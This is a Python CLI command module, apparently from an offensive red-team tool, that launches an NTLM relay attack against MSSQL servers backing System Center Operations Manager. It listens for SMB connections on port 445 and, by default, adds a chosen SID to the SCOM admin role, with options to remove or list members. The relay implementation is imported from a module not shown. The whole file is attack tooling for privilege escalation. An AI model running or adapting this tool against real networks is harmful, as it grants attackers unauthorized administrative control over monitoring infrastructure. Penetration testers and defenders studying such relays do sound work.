import typer
from lib.attacks.relay import MSSQLSCOMRELAY
from lib.logger import init_logger

app = typer.Typer()
COMMAND_NAME = 'relay'
HELP = 'SCOM MSSQL NTLM Relay Attack - Manipulate SCOM admin role membership'

@app.callback(no_args_is_help=True, invoke_without_command=True)
def main(
    target          : str   = typer.Option(None, "-t", "--target", help="Single target MSSQL server"),
    target_file     : str   = typer.Option(None, "-tf", "--target-file", help="File containing list of MSSQL servers (one per line)"),
    sid             : str   = typer.Option(None, "-s", "--sid", help="SID of user to add/remove"),
    interface       : str   = typer.Option("0.0.0.0", "-i", "--interface", help="Interface to listen on"),
    port            : int   = typer.Option(445, "-p", "--port", help="Port to listen on for incoming SMB connections"),
    timeout         : int   = typer.Option(5, "--timeout", help="Connection timeout in seconds"),
    update          : bool  = typer.Option(False, '-u', '--update', help='Add user to SCOM admin role (default)'),
    delete          : bool  = typer.Option(False, '-d', '--delete', help='Remove user from SCOM admin role'),
    list_members    : bool  = typer.Option(False, '-l', '--list', help='List current members of SCOM admin role'),
    verbose         : bool  = typer.Option(False, '-v', '--verbose', help='Enable verbose logging'),
    ):
    
    init_logger(verbose)
    
    # Validate target arguments
    if not target and not target_file:
        typer.echo("Error: Either -t/--target or -tf/--target-file must be specified")
        raise typer.Exit(1)
    
    if target and target_file:
        typer.echo("Error: Cannot specify both -t/--target and -tf/--target-file")
        raise typer.Exit(1)
    
    # Determine operation mode
    operation_mode = 'update'  # default
    mode_count = sum([update, delete, list_members])
    
    if mode_count > 1:
        typer.echo("Error: Only one operation mode can be specified at a time (-u, -d, or -l)")
        raise typer.Exit(1)
    
    if delete:
        operation_mode = 'delete'
    elif list_members:
        operation_mode = 'list'
    
    # Validate SID requirement for non-list operations
    if operation_mode != 'list' and not sid:
        typer.echo("Error: SID (-s/--sid) is required for update and delete operations")
        typer.echo("Use -l/--list to list members without specifying a SID")
        raise typer.Exit(1)
    
    # Create and start the relay
    scom_relay = MSSQLSCOMRELAY(
        target=target,
        target_file=target_file,
        sid=sid,
        interface=interface,
        port=port,
        timeout=timeout,
        operation_mode=operation_mode,
        verbose=verbose
    )
    
    scom_relay.start()
